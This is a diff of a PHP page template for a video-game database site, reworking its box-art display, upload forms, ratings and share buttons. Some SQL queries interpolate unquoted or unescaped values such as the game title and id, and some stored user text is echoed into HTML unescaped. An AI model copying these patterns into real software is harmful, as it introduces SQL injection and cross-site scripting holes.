-                        -->
-
-                        <?php	if ($adminuserlevel == 'ADMINISTRATOR') {  ?>
-						<tr>
-							<td colspan="2">
-								<hr />
-							</td>
-						</tr>
-                        <tr>
-                            <td><strong>Banner Requests:</strong></td>
-                            <td><input type="text" name="bannerrequest" value="<?=$game->bannerrequest?>" maxlength="10"></td>
-                        </tr>
-                        <tr>
-                            <td valign="top"><strong>Disable Game:</strong></td>
-                            <td>
-                                <select name="disabled" size="1">
-                                    <option>
-                                    <option <?php if ($game->disabled=='Yes') print 'selected'; ?>>Yes
-                                    <option <?php if ($game->disabled=='No') print 'selected'; ?>>No
-                                </select>
-                                <div id="formnote">Setting this flag will disable image uploads for this game. Use for innacurate or duplicate games.</div>
-                            </td>
-                        </tr>
-
-                            <?php	}  ?>
-                        <tr>
-                            <td valign="top">&nbsp;</td>
-                            <td>
-                                <div id="formnote"><strong>Game Last Updated:</strong> <?=date("r", $game->lastupdated)?></div>
-                            </td>
-                        </tr>
-                        <?php	if ($loggedin == 1) {  ?>
-                        <tr>
-                            <td style="text-align: center" colspan="2" valign="top">
-                                    <?php	if ($game->locked != 'yes' OR $lockadmin->userlevel == 'ADMINISTRATOR') {  ?>
-                                <input type="submit" name="function" value="Save Game" class="button submit">
-                                <input type="hidden" name="newshowid" value="<?=$game->id?>">
-
-                                        <?php	if ($adminuserlevel == 'ADMINISTRATOR') {  ?>
-                                <input type="submit" name="function" value="Delete Game" class="button submit_red" onClick="return confirmSubmit()"><br>
-                                            <?php	}
-                                    }
-                                    ?>
-
-                                <div id='denied_popup' style='width: 400px; height: 500px; display:none; position: absolute; top: 500px; left: 400px;'>
-                                    <table width='380' cellpadding='0' cellspacing='0' border='0'>
-                                        <tr>
-                                            <td><img height='23' width='406' src='popup_title.gif' alt="" class='dragme'></td>
-                                            <td><a href='javascript:deniedcommentClose();'><img height='23' alt="" width='24' src='popup_close.gif' border='0'></a></td>
-                                        </tr>
-                                        <tr><td colspan='2' style='background: url("popup_body.gif") no-repeat top left; width: 650px; height: 277px;'>
-                                                <div id="formContainer" style="width: 400px; height: 250px; margin-left:15px; margin-top:15px;">
-                                                    <font color="black">
-                                                        <b><?php echo $users->username ?></b> made this request.<br>
-                                                        <b>Reason given for TV.com update request: </font><br><font color=red><?php echo "$game->requestcomment" ?></font></b>
-                                                    <TEXTAREA NAME="comments" COLS=40 ROWS=6></TEXTAREA>
-                                                    <input type="hidden" name="email" value="<?php echo $users->emailaddress ?>">
-                                                    <input type="hidden" name="gametitle" value="<?php echo $game->GameTitle ?>">
-                                                    <input type="submit" name="function" value="Deny TV.com Update" class="submit_long">
-                                                </div>
-                                            </td></tr>
-                                    </table>
-                                </div>
-                                <div id='request_popup' style='width: 400px; height: 500px; display:none; position: absolute; top: 500px; left: 400px;'>
-                                    <table width='380' cellpadding='0' cellspacing='0' border='0'>
-                                        <tr>
-                                            <td><img height='23' width='406' src='popup_title.gif' alt="" class='dragme'></td>
-                                            <td><a href='javascript:requestcommentClose();'><img height='23' alt="" width='24' src='popup_close.gif' border='0'></a></td>
-                                        </tr>
-                                        <tr><td colspan='2' style='background: url("popup_body.gif") no-repeat top left; width: 650px; height: 277px;'>
-                                                <div id="formContainer" style="width: 400px; height: 250px; margin-left:15px; margin-top:15px;">
-                                                    <font color="black">
-                                                        <b>Please explain why the request was made.<br>Maximum 255 Characters
-                                                            </font>
-                                                            <input type="hidden" name="requestreason" value="<?php echo "$game->requestcomment" ?>">
-                                                            <textarea name=requestcomments COLS=45 ROWS=6 onkeyup="TAlimit(this)"></textarea>
-                                                            <input type="submit" name="function" value="Request TV.com Update" class="submit_long">
-                                                            </div>
-                                                            </td></tr>
-                                                            </table>
-                                                            </div>
-
-                                                                <?php
-                                                                if ($game->locked != 'yes') {
-                                                                    if ($game->id && $tvupdates==1) {
-                                                                        if ($adminuserlevel == 'ADMINISTRATOR') {
-																		?>
-                                                                            <input type="submit" value="Lock Game" name="function" class="button submit">
-                                                                            <input type="submit" value="UnLock Game" name="function" class="button submit" disabled><br>
-																		<?php
-                                                                        }
-                                                                    }
-                                                                    ELSE //No Game ID
-                                                                    {
-                                                                        if ($adminuserlevel == 'ADMINISTRATOR') {
-																		?>
-                                                                            <input type="submit" value="Lock Game" name="function" class="button submit">
-                                                                            <input type="submit" value="UnLock Game" name="function" class="button submit" disabled><br>
-																		<?php
-                                                                        }
-                                                                    }
-                                                                }
-                                                                ELSE //Record is Locked
-                                                                {
-                                                                    if ($adminuserlevel == 'ADMINISTRATOR') {
-																	?>
-                                                                        <input type="submit" value="Lock Game" name="function" class="button submit" disabled>
-                                                                        <input type="submit" value="UnLock Game" name="function" class="button submit"><br>
-																	<?php
-                                                                    }
-                                                                    elseif ($_SESSION['userlevel'] == 'ADMINISTRATOR') {
-																	?>
-                                                                        <input type="submit" value="Lock Game" name="function" class="button submit" disabled>
-                                                                        <input type="submit" value="UnLock Game" name="function" class="button submit"><br>
-																	<?php
-                                                                    }
-                                                                    print "<div id=formnote style='color: red;'>This game is locked and cannot be changed. It was locked by $lockadmin->username</div>";
-                                                                }
-                                                                ?>
-                                                            </div>
-                                                            </td>
-                                                            </tr>
-                                                                <?php	}  ?>
-
-                                                            </table>
-                                                            </form>
-                                                            </div>
-	</div>
-	
-	<div id="gameOtherPlatforms">
-		<h3 class="arcade">Other Platforms with this Game</h3>
-		<?php
-			$similarResult = mysql_query(" SELECT g.id, g.platform, g.GameTitle, p.name, p.icon FROM games as g, platforms as p WHERE g.GameTitle = \"$game->GameTitle\" AND g.Platform <> '$game->Platform' AND g.Platform = p.id ORDER BY p.name");
-			$similarRowCount = mysql_num_rows($similarResult);
-			if($similarRowCount > 0)
+			if($axis == "width")
 			{
-				?>
-				<p style="font-size: 14px; margin: 5px;">This game exists on <?=$similarRowCount?> other platforms.</p>
-				<div id="gameOtherPlatformsList">
-				<?php
-				while($similarRow = mysql_fetch_assoc($similarResult))
-				{
-					?>
-						<div style="margin-top: 10px; font-size: 16px;"><img src="images/common/consoles/png32/<?=$similarRow['icon']?>" alt="<?=$similarRow['name']?>" style="vertical-align: -8px;" />&nbsp;&nbsp;<a href="<?=$baseurl?>?tab=game&id=<?=$similarRow['id']?>"><?=$similarRow['name']?> - <?=$similarRow['GameTitle']?></a></div>
-					<?php
-				}
-				?>
-				<p style="font-size: 14px;">If you know that this game exists on another platform, why not <a href="<?=$baseurl?>?tab=addgame&passTitle=<?=$game->GameTitle?>">add it</a>.</p>
-				</div>
-				<?php
+				$percentage = ($target / $width);
+			}
+			else if ($axis == "height")
+			{
+				$percentage = ($target / $height);
+			}
+			else if ($width > $height)
+			{
+				$percentage = ($target / $width);
 			}
 			else
 			{
-				?>
-				<p style="font-size: 16px; line-height: 70px; vertical-align: middle;">There are currently no other platforms that have this game yet...</p>
-				<p style="font-size: 16px;">If you know of one, why not <a href="<?=$baseurl?>?tab=addgame&passTitle=<?=$game->GameTitle?>">add it</a>.</p>
-				<?php
+				$percentage = ($target / $height);
 			}
-		?>
-	</div>
-	
-	<?php if ($loggedin == 1) {  ?>
-	<div style="border-top: 2px dotted #666; padding-top: 20px; margin-top: 10px;">
-	
-	<?php if ($loggedin == 1) {  ?>
-	<div id="frontBoxartUpload" class="miniPanel">
-		<h2><img src="images/common/icons/upload-black_32.png" alt="Upload" style="vertical-align: -7px;" /> Front Box Art Upload</h2>
-		<?php  	## check for agreement to terms
-		if ($user->banneragreement != 1) {
-			print "You must agree to the site terms and conditions before you can upload. Go to the <a href=\"/?tab=agreement\">Agreement Page</a>";
-		} ## Check for disabled banner upload
-		elseif ($user->bannerlimit == 0) {
-			print "Your ability to upload has been removed. If you believe this has happened in error contact <a href=\"mailto:$adminuser->emailaddress\">$adminuser->username</a>";
-		} ## Check banner limit
-		elseif ($game->disabled == 'Yes') {
-			print "The ability to upload has been removed, because an admin has flagged this record as a duplicate or inaccurate";
+			
+			//gets the new value and applies the percentage, then rounds the value
+			$width = round($width * $percentage);
+			$height = round($height * $percentage); 
+			
+			$image = new SimpleImage();
+			$image->load($filename);
+			$image->resize($width, $height);
+			$image->save($cleanFilename);
+			$image = null;
 		}
-		else {
-			?>
-		<p>The only accepted image formats for box art is JPG and PNG.</p>
-		<p>Images must be of good quality. We don't want blurry or pixelated images.</p>
-		<p>More information can be found on the <a href="http://thegamesdb.net/?tab=terms" target="_blank">Terms and Conditions page</a>.</p>
-		<form action="<?=$fullurl?>" method="POST" enctype="multipart/form-data">
-			<table width="100%" border="0" cellspacing="0" cellpadding="2" align="center" class="info">
-				<tr>
-					<td>File:
-						<input type="file" name="bannerfile" size="36">
-					</td>
-				</tr>
-				<tr>
-					<td>
-						<p><em>Please Note: Uploading an image with out saving game info first will result in data loss.</em></p>
-					</td>
-				</tr>
-				<tr>
-					<td style="text-align: right">
-						<input type="hidden" name="cover_side" value="front">
-						<input type="hidden" name="function" value="Upload Box Art">
-						<input type="submit" name="button" value="Upload" class="submit">
-					</td>
-				</tr>
-			</table>
-		</form>
-			<?php } ?>
-	</div>
-	<?php } ?>
+		//returns the new sizes in html image tag format...this is so you can plug this function inside an image tag and just get the
+		return "src=\"$baseurl/$cleanFilename\"";
+	}
 	
-	<?php if ($loggedin == 1) {  ?>
-	<div id="rearBoxartUpload" class="miniPanel">
-		<h2><img src="images/common/icons/upload-black_32.png" alt="Upload" style="vertical-align: -7px;" /> Rear Box Art Upload</h2>
-		<?php  	## check for agreement to terms
-		if ($user->banneragreement != 1) {
-			print "You must agree to the site terms and conditions before you can upload. Go to the <a href=\"/?tab=agreement\">Agreement Page</a>";
-		} ## Check for disabled banner upload
-		elseif ($user->bannerlimit == 0) {
-			print "Your ability to upload has been removed. If you believe this has happened in error contact <a href=\"mailto:$adminuser->emailaddress\">$adminuser->username</a>";
-		} ## Check banner limit
-		elseif ($game->disabled == 'Yes') {
-			print "The ability to upload has been removed, because an admin has flagged this record as a duplicate or inaccurate";
+	function imageDualResize($filename, $cleanFilename, $wtarget, $htarget)
+	{
+		if(!file_exists($cleanFilename))
+		{
+			$dims = getimagesize($filename);
+			$width = $dims[0];
+			$height = $dims[1];
+			
+			while($width > $wtarget || $height > $htarget)
+			{
+				if($width > $wtarget)
+				{
+					$percentage = ($wtarget / $width);
+				}
+			
+				if($height > $htarget)
+				{
+					$percentage = ($htarget / $height);
+				}
+			
+				/*if($width > $height)
+				{
+					$percentage = ($target / $width);
+				}
+				else
+				{
+					$percentage = ($target / $height);
+				}*/
+				
+				//gets the new value and applies the percentage, then rounds the value
+				$width = round($width * $percentage);
+				$height = round($height * $percentage); 
+			}
+			
+			$image = new SimpleImage();
+			$image->load($filename);
+			$image->resize($width, $height);
+			$image->save($cleanFilename);
+			$image = null;
 		}
-		else {
-			?>
-		<p>The only accepted image formats for box art is JPG and PNG.</p>
-		<p>Images must be of good quality. We don't want blurry or pixelated images.</p>
-		<p>More information can be found on the <a href="http://thegamesdb.net/?tab=terms" target="_blank">Terms and Conditions page</a>.</p>
-		<form action="<?=$fullurl?>" method="POST" enctype="multipart/form-data">
-			<table width="100%" border="0" cellspacing="0" cellpadding="2" align="center" class="info">
-				<tr>
-					<td>File:
-						<input type="file" name="bannerfile" size="36">
-					</td>
-				</tr>
-				<tr>
-					<td>
-						<p><em>Please Note: Uploading an image with out saving game info first will result in data loss.</em></p>
-					</td>
-				</tr>
-				<tr>
-					<td style="text-align: right">				
-						<input type="hidden" name="cover_side" value="back">
-						<input type="hidden" name="function" value="Upload Box Art">
-						<input type="submit" name="button" value="Upload" class="submit">
-					</td>
-				</tr>
-			</table>
-		</form>
-			<?php } ?>
-	</div>
-	<?php } ?>
-	
-	<?php	if ($loggedin == 1) {  ?>
-	<div id="fanartUpload" class="miniPanel">
-		<form action="<?=$fullurl?>" method="POST" enctype="multipart/form-data">
-			<h2><img src="images/common/icons/upload-black_32.png" alt="Upload" style="vertical-align: -7px;" /> Fan Art Upload</h2>
+		//returns the new sizes in html image tag format...this is so you can plug this function inside an image tag and just get the
+		return "src=\"$baseurl/$cleanFilename\"";
+	}
+?>
 
-				<?php  	## check for agreement to terms
-				if ($user->banneragreement != 1) {
-					print "You must agree to the site terms and conditions before you can upload. Go to the <a href=\"/?tab=agreement\">Agreement Page</a>";
-				} ## Check for disabled banner upload
-				elseif ($user->bannerlimit == 0) {
-					print "Your ability to upload has been removed. If you believe this has happened in error contact <a href=\"mailto:$adminuser->emailaddress\">$adminuser->username</a>";
-				} ## Check banner limit
-				elseif ($game->disabled == 'Yes') {
-					print "The ability to upload has been removed, because an admin has flagged this record as a duplicate or inaccurate";
-				}
-				else {
-					?>
-			<p>All fan art resolutions <strong>must</strong> be 1920x1080 <em>(2MB Max Size)</em> or 1280x720.<em>(600KB Max Size)</em></p>
-			<p>The only accepted image format for fan art is JPG.</p>
-			<p>Images must be of good quality. We don't want blurry or pixelated images.</p>
-			<p>Please set your artist colors after uploading.</p>
-			<p>More information can be found on the <a href="http://thegamesdb.net/?tab=terms" target="_blank">Terms and Conditions page</a>.</p>
-			<table width="100%" border="0" cellspacing="0" cellpadding="2" align="center" class="info">
-				<tr>
-					<td><strong>File to Upload:</strong><br /><br />
-						<input type="file" name="bannerfile" size="42">
-					</td>
-				</tr>
-				<tr>
-					<td>
-						<p><em>Please Note: Uploading an image with out saving game info first will result in data loss.</em></p>
-					</td>
-				</tr>
-				<tr>
-					<td style="text-align: right">
-						<input type="hidden" name="function" value="Upload Fan Art">
-						<input type="submit" name="button" value="Upload" class="submit">
-					</td>
-				</tr>
-			</table>
-					<?php
-				}
-				?>
-		</form>
-	</div>
-	<?php	}  ?>
-	
-	<?php	if ($loggedin == 1) {  ?>
-	<div id="screenshotUpload" class="miniPanel">
-		<form action="<?=$fullurl?>" method="POST" enctype="multipart/form-data">
-			<h2><img src="images/common/icons/upload-black_32.png" alt="Upload" style="vertical-align: -7px;" /> Screenshot Upload</h2>
+<?php
+	// Fetch Game Information from DB
+	$id = mysql_real_escape_string($id);
+	$query	= "SELECT g.*, p.name as PlatformName, p.icon as PlatformIcon FROM games as g, platforms as p WHERE g.id=$id AND g.Platform = p.id";
+	$result = mysql_query($query) or die('Fetch Game Info Query Failed: ' . mysql_error());
+	$rows = mysql_num_rows($result);
+	$game = mysql_fetch_object($result);
+?>
 
-				<?php  	## check for agreement to terms
-				if ($user->banneragreement != 1) {
-					print "You must agree to the site terms and conditions before you can upload. Go to the <a href=\"/?tab=agreement\">Agreement Page</a>";
-				} ## Check for disabled banner upload
-				elseif ($user->bannerlimit == 0) {
-					print "Your ability to upload has been removed. If you believe this has happened in error contact <a href=\"mailto:$adminuser->emailaddress\">$adminuser->username</a>";
-				} ## Check banner limit
-				elseif ($game->disabled == 'Yes') {
-					print "The ability to upload has been removed, because an admin has flagged this record as a duplicate or inaccurate";
-				}
-				else {
-					?>
-			<p>All screenshots <strong>must</strong> be a maximum of <strong>2MB file size.</strong></p>
-			<p>The only accepted image format for screenshots is JPG.</p>
-			<p>Images must be of good quality. We don't want blurry or pixelated images. (But screens of older pixel art style games are ok!)</p>
-			<p>More information can be found on the <a href="http://thegamesdb.net/?tab=terms" target="_blank">Terms and Conditions page</a>.</p>
-			<table width="100%" border="0" cellspacing="0" cellpadding="2" align="center" class="info">
-				<tr>
-					<td><strong>File to Upload:</strong><br /><br />
-						<input type="file" name="bannerfile" size="42">
-					</td>
-				</tr>
-				<tr>
-					<td>
-						<p><em>Please Note: Uploading an image with out saving game info first will result in data loss.</em></p>
-					</td>
-				</tr>
-				<tr>
-					<td style="text-align: right">
-						<input type="hidden" name="function" value="Upload Screenshot">
-						<input type="submit" name="button" value="Upload" class="submit">
-					</td>
-				</tr>
-			</table>
-					<?php
-				}
-				?>
-		</form>
-	</div>
-	<?php	}  ?>
-	
-	<?php	if ($loggedin == 1) {  ?>
-	<div id="bannerUpload" class="miniPanel">
-		<form action="<?=$fullurl?>" method="POST" enctype="multipart/form-data">
-			<h2><img src="images/common/icons/upload-black_32.png" alt="Upload" style="vertical-align: -7px;" /> Banner Upload</h2>
+<div id="gameWrapper">
+	<div id="gameHead">
 
-				<?php  	## check for agreement to terms
-				if ($user->banneragreement != 1) {
-					print "You must agree to the site terms and conditions before you can upload. Go to the <a href=\"/?tab=agreement\">Agreement Page</a>";
-				} ## Check for disabled banner upload
-				elseif ($user->bannerlimit == 0) {
-					print "Your ability to upload has been removed. If you believe this has happened in error contact <a href=\"mailto:$adminuser->emailaddress\">$adminuser->username</a>";
-				} ## Check banner limit
-				elseif ($game->disabled == 'Yes') {
-					print "The ability to upload has been removed, because an admin has flagged this record as a duplicate or inaccurate";
-				}
-				elseif ($userbanners < $user->bannerlimit || $adminuserlevel == 'ADMINISTRATOR') {
-					?>
-			<p>All banner resolutions <strong>must</strong> be 760x140.</p>
-			<p>The only accepted image formats for banners are JPG and PNG.</p>
-			<p>Images must be of good quality. We don't want blurry or pixelated images.</p>
-			<p>More information can be found on the <a href="http://thegamesdb.net/?tab=terms" target="_blank">Terms and Conditions page</a>.</p>
-			<p><strong>Banner Type:</strong>
-				<select name="subkey" size="1">
-					<option value="graphical">Graphical</option>
-					<option value="text">Text</option>
-					<option value="blank">Blank</option>
-				</select></p>
-			<p><nobr><strong>Banner Language:</strong></nobr>
-				<select name="languageid" size="1">
-					<?php
-
-					## Display language selector
-					foreach ($languages AS $langid => $langname) {
-						## If we have the currently selected language
-						if ($lid == $langid) {
-							$selected = 'selected';
-						}
-						## Otherwise
-						else {
-							$selected = '';
-						}
-
-						## If a translation is found
-						print "<option value=\"$langid\" $selected>$langname</option>\n";
-					}
-					?>
-					</select></p>
-				<p><strong>File:</strong> <input type="file" name="bannerfile" size="36"></p>
-				<p><em>Please Note: Uploading an image with out saving game info first will result in data loss.</em></p>
-				<p style="text-align: right;">
-					<input type="hidden" name="function" value="Upload Game Banner">
-					<input type="submit" name="button" value="Upload" class="submit">
-				</p>
-				<?php
-				} ## Print banner limit message
-				else {
-					print "<p>You have already uploaded $userbanners banners for this game, which is your banner limit.  To get your banner limit increased, please post a request on the forums.</p>";
-				}
-				?>
-		</form>
-	</div>
-	<?php	}  ?>
+	<?php if($errormessage): ?>
+	<div class="error"><?= $errormessage ?></div>
+	<?php endif; ?>
+	<?php if($message): ?>
+	<div class="message"><?= $message ?></div>
+	<?php endif; ?>
 	
-	</div>
-	<?php	}  ?>
+	<?php
+	if(mysql_num_rows($result) != 0)
+	{
+	?>
 	
-	<div style="clear: both;"></div>
-	
-</div>
-
-<div id="gameOptionsRight">
-		<?php	if ($loggedin == 1) {  ?>
-		<div style="text-align: center; margin-top: 10px;">
+		<div id="gameTitle">
+			<?php	if ($loggedin == 1) {  ?>
+				<span id ="gameUserLinks"><a href="<?=$baseurl?>?tab=game-edit&id=<?=$game->id?>"><img src="<?php echo $baseurl; ?>/images/common/icons/edit_128.png" style="width:16px; height: 16px; vertical-align: middle;" /></a>&nbsp;<a href="<?=$baseurl?>/game-edit/<?=$game->id?>/">Edit this Game</a>&nbsp;&nbsp;|&nbsp;
 				<?php	## First, generate their userfavorites array
-				$userfavorites = explode(",", $user->favorites);
+					$userfavorites = explode(",", $user->favorites);
 
-				## If the user has this as a favorite, display a message and a button
-				## to "Un-favorite".
-				if (in_array($id, $userfavorites, 1)) {
-					print "<a href=\"/?function=ToggleFavorite&id=$id\"><img src='images/game/badge-favorite.png' alt='Favorite' border='0' width='300' height='75'></a>";
-				}
-				## If the user doesn't have this as a favorite, display a button to
-				## mark it as a favorite.
-				else {
-					print "<a href=\"/?function=ToggleFavorite&id=$id\"><img src='images/game/badge-not-favorite.png' alt='Not Favorite' border='0' width='300' height='75'></a>";
-				}
+					## If the user has this as a favorite, display a message and a button
+					## to "Un-favorite".
+					if (in_array($id, $userfavorites, 1)) {
+						print "<a href=\"/?function=ToggleFavorite&id=$id\"><img src=\"$baseurl/images/common/icons/favorite_48.png\" style=\"width:16px; height: 16px; vertical-align: middle;\" /></a>&nbsp;<a href=\"/?function=ToggleFavorite&id=$id\">Unfavorite this Game</a>";
+					}
+					## If the user doesn't have this as a favorite, display a button to
+					## mark it as a favorite.
+					else {
+						print "<a href=\"/?function=ToggleFavorite&id=$id\"><img src=\"$baseurl/images/common/icons/favorite_48.png\" style=\"width:16px; height: 16px; vertical-align: middle;\" /></a>&nbsp;<a href=\"/?function=ToggleFavorite&id=$id\">Favorite this Game</a>";
+					}
 				?>
+			<?php } ?></span>
+			<h1 style="margin: 0px; padding: 0px;"><?php echo $game->GameTitle; ?></h1>
+			<?php if(!empty($game->Alternates)) { ?>
+				<h3><span style="color: #888; font-size: 13px;"><em>
+			<?php echo "a.k.a. ' " . str_replace(",", ", ", $game->Alternates) . " ' "; ?>
+				</em></span></h3>
+			<?php } ?>
 		</div>
-			<?php	}  ?>
+		<div id="gameCoversWrapper">
+			<div id="gameCovers">
+				<?php
+					if ($frontCoverResult = mysql_query(" SELECT b.filename FROM banners as b WHERE b.keyvalue = '$game->id' AND b.filename LIKE '%boxart%front%' LIMIT 1 "))
+					{
+						$front = mysql_fetch_object($frontCoverResult);
+						if (!empty($front))
+						{
+							?>
+							<img id="frontCover" class="frontCover imgShadow" <?=imageResize("$baseurl/banners/$front->filename", "banners/_gameviewcache/$front->filename", 300, "width")?> alt="<?php echo $game->GameTitle; ?>" title="<?php echo $game->GameTitle; ?>" />
+							<?php
+							if ($backCoverResult = mysql_query(" SELECT b.filename FROM banners as b WHERE b.keyvalue = '$game->id' AND b.filename LIKE '%boxart%back%' LIMIT 1 "))
+							{
+								$back = mysql_fetch_object($backCoverResult);
+								if (!empty($back))
+								{
+								?>
+								<img  id="backCover" class="backCover imgShadow" style="display: none;" <?=imageResize("$baseurl/banners/$back->filename", "banners/_gameviewcache/$back->filename", 300, "width")?> alt="<?php echo $game->GameTitle; ?>" title="<?php echo $game->GameTitle; ?>" />
+								<?php
+								}
+							}
+						}
+						else
+						{
+						?>
+							<img class="imgShadow" src="<?php echo $baseurl; ?>/images/common/placeholders/boxart_blank.png" width="300" height="417" alt="<?php echo $game->GameTitle; ?>" title="<?php echo $game->GameTitle; ?>" />
+						<?php
+						}
+					}
+				?>
+			</div>
+			<p style="text-align: center; font-size: 15px;">
+			<?php
+			if (!empty($front) && !empty($back))
+			{
+			?>
+			<a href="javascript: void();" class="gameCoversFlip"><img src="<?php echo $baseurl; ?>/images/common/icons/flip_32.png" style="width:24px; height: 24px; vertical-align: -7px;" /></a>&nbsp;<a href="javascript: void();" class="gameCoversFlip">Flip</a>&nbsp;&nbsp;|&nbsp;&nbsp;
+			<?php
+			}
+			if (!empty($front))
+			{
+			?>
+			<a href="<?="$baseurl/banners/$front->filename"?>" target="_blank"><img src="<?php echo $baseurl; ?>/images/common/icons/expand_48.png" style="width:24px; height: 24px; vertical-align: -6px;" /></a>&nbsp;<a href="<?="$baseurl/banners/$front->filename"?>" target="_blank">Front</a>&nbsp;&nbsp;|&nbsp;&nbsp;
+			<?php
+			}
+			if (!empty($back))
+			{
+			?>
+			<a href="<?="$baseurl/banners/$back->filename"?>" target="_blank"><img src="<?php echo $baseurl; ?>/images/common/icons/expand_48.png" style="width:24px; height: 24px; vertical-align: -6px;" /></a>&nbsp;<a href="<?="$baseurl/banners/$back->filename"?>" target="_blank">Back</a></p>
+			<?php
+			}
+			?>
+		</div>
+		<div id="gameInfo">
+			<span style="float: right;">
+				
+				<!-- Google plus share button -->
+				<span style="float: right;">
+				<!-- Place this tag where you want the +1 button to render -->
+				<g:plusone size="medium"></g:plusone>
 
-
-
-		<div class="miniPanel">
-			<h2 class="arcade">Rating</h2>
-			<table cellspacing="0" cellpadding="0" border="0" width="100%">
-				<tr>
-					<td><b>Site Rating:</b></td>
-					<td align="right">
-						<?php	## Get site rating for this series
-						$query	= "SELECT AVG(rating) AS average, count(*) AS count FROM ratings WHERE itemtype='game' AND itemid=$id";
+				<!-- Place this render call where appropriate -->
+				<script type="text/javascript">
+				  (function() {
+					var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+					po.src = 'https://apis.google.com/js/plusone.js';
+					var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+				  })();
+				</script>
+				</span>
+				
+				<!-- Twitter share button -->
+				<span style="float: right;">
+				<a href="https://twitter.com/share" class="twitter-share-button" data-url="<?= "$baseurl/game/$game->id/" ?>" data-text="<?= "$game->GameTitle on TheGamesDB.net" ?>" data-count="horizontal" data-via="thegamesdb">Tweet</a><script type="text/javascript" src="//platform.twitter.com/widgets.js"></script>
+				</span>
+				
+				<!-- Facebook share button -->
+				<span style="float: right; padding-top: 1px;">
+				<a name="fb_share"></a> 
+				<script src="http://static.ak.fbcdn.net/connect.php/js/FB.Share" 
+						type="text/javascript">
+				</script>
+				&nbsp;
+				</span>
+				
+				<!-- Share via Email button -->
+				<a href="<?= $baseurl; ?>/mailshare.php?urlsubject=<?= urlencode("TheGamesDB.net - $game->GameTitle"); ?>&url=<?= urlencode("$baseurl/game/$game->id/"); ?>" rel="facebox" style="float: right; margin-right: 10px; padding: 1px 6px 1px 3px; color: #fff; text-decoration: none; background-color: #333; border: 1px solid #444; border-radius: 3px; font-size: 11px; font-weight: bold;" onmouseover="$('#mailIcon').attr('src', '<?= $baseurl ?>/images/common/icons/social/24/share_active.png')" onmouseout="$('#mailIcon').attr('src', '<?= $baseurl ?>/images/common/icons/social/24/share_dark.png')"><img id="mailIcon" src="<?= $baseurl ?>/images/common/icons/social/24/share_dark.png" alt="Share via Email" title="Share via Email" style="vertical-align: middle; width: 18px; height: 18px;" />&nbsp;Share via Email</a>
+				
+			</span>
+			
+			<h2><img src="<?php echo $baseurl; ?>/images/common/consoles/png32/<?php echo $game->PlatformIcon; ?>" alt="<?php echo $game->PlatformName; ?>" title="<?php echo $game->PlatformName; ?>" style="vertical-align: -8px;" />&nbsp;<?php if (!empty($game->PlatformName)) { ?>
+			<a style="color: #fff;" href="<?= $baseurl ?>/platform/<?= $game->Platform ?>/"><?= $game->PlatformName ?></a>
+			<?php } else { echo "N/A"; } ?></h2>
+			<hr />
+			<div id="gameRating">
+				<?php
+					$query	= "SELECT AVG(rating) AS average, count(*) AS count FROM ratings WHERE itemtype='game' AND itemid=$id";
 						$result = mysql_query($query) or die('Query failed: ' . mysql_error());
 						$rating = mysql_fetch_object($result);
 
-						for ($i = 1; $i <= 10; $i++) {
+						for ($i = 2; $i <= 10; $i = $i + 2) {
 							if ($i <= $rating->average) {
 								print "<img src=\"$baseurl/images/game/star_on.png\" width=15 height=15 border=0>";
+							}
+							else if ($rating->average > $i - 2 && $rating->average < $i) {
+								print "<img src=\"$baseurl/images/game/star_half.png\" width=15 height=15 border=0>";
 							}
 							else {
 								print "<img src=\"$baseurl/images/game/star_off.png\" width=15 height=15 border=0>";
 							}
 						}
 						?>
-						<div id="smalltext"><?=$rating->count?> rating<?php if ($rating->count != 1) print "s" ?></div>
-					</td>
-				</tr>
-
-				<?php	if ($loggedin == 1) {  ?>
-				<tr>
-					<td><b>Your Rating:</b></td>
-					<td align="right">
-
-							<?php	## Get user rating for this series
+						&nbsp;&nbsp;<span style="font-weight: bold; color: #bbb;"><?=(int)$rating->average?> / 10</span>
+						&nbsp;&nbsp;<span style="color: #888; font-size: 13px;"><em><?=$rating->count?> rating<?php if ($rating->count != 1) print "s" ?></em></span>
+						<?php	if ($loggedin == 1) {  ?>
+						&nbsp;&nbsp;|&nbsp;&nbsp;Your Rating:&nbsp;
+						<?php
 							$query	= "SELECT rating FROM ratings WHERE itemtype='game' AND itemid=$id AND userid=$user->id";
 							$result = mysql_query($query) or die('Query failed: ' . mysql_error());
 							$rating = mysql_fetch_object($result);
@@ -758,313 +260,696 @@ if($rows != 0)
 
 							for ($i = 1; $i <= 10; $i++) {
 								if ($i <= $rating->rating) {
-									print "<a href=\"?tab=game&id=$id&function=UserRating&type=game&itemid=$id&rating=$i\" OnMouseOver=\"UserRating2('userrating',$i)\" OnMouseOut=\"UserRating2('userrating',$rating->rating)\"><img src=\"$baseurl/images/game/star_on.png\" width=15 height=15 border=0 name=\"userrating$i\"></a>";
+									print "<a href=\"$baseurl/game/$id/?function=UserRating&type=game&itemid=$id&rating=$i\" OnMouseOver=\"UserRating2('userrating',$i)\" OnMouseOut=\"UserRating2('userrating',$rating->rating)\"><img src=\"$baseurl/images/game/star_on.png\" width=15 height=15 border=0 name=\"userrating$i\"></a>";
 								}
 								else {
-									print "<a href=\"?tab=game&id=$id&function=UserRating&type=game&itemid=$id&rating=$i\" OnMouseOver=\"UserRating2('userrating',$i)\" OnMouseOut=\"UserRating2('userrating',$rating->rating)\"><img src=\"$baseurl/images/game/star_off.png\" width=15 height=15 border=0 name=\"userrating$i\"></a>";
+									print "<a href=\"$baseurl/game/$id/?function=UserRating&type=game&itemid=$id&rating=$i\" OnMouseOver=\"UserRating2('userrating',$i)\" OnMouseOut=\"UserRating2('userrating',$rating->rating)\"><img src=\"$baseurl/images/game/star_off.png\" width=15 height=15 border=0 name=\"userrating$i\"></a>";
 								}
 							}
 							?>
-					</td>
-				</tr>
-					<?php	}  ?>
-			</table>
-		</div>
-
-</div>
-		
-<div id="gameRight">
-		
-		<!-- Start Front Boxart Panel -->
-		<div class="miniPanel boxart">
-			<h2 class="arcade">Front Box Art</h2>
-			<?php	## Display all fanart for this show
-			$bannercount = 0;
-			$query	= "SELECT *, (SELECT username FROM users WHERE id=banners.userid) AS creator, (SELECT AVG(rating) FROM ratings WHERE itemtype='banner' AND itemid=banners.id) AS rating, (SELECT COUNT(rating) FROM ratings WHERE itemtype='banner' AND itemid=banners.id) AS ratingcount FROM banners WHERE keytype='boxart' AND keyvalue=$id AND filename LIKE '%front%' ORDER BY rating DESC,RAND()";
-			$result = mysql_query($query) or die('Query failed: ' . mysql_error());
-			?>
-			<ul class="boxartSlide">
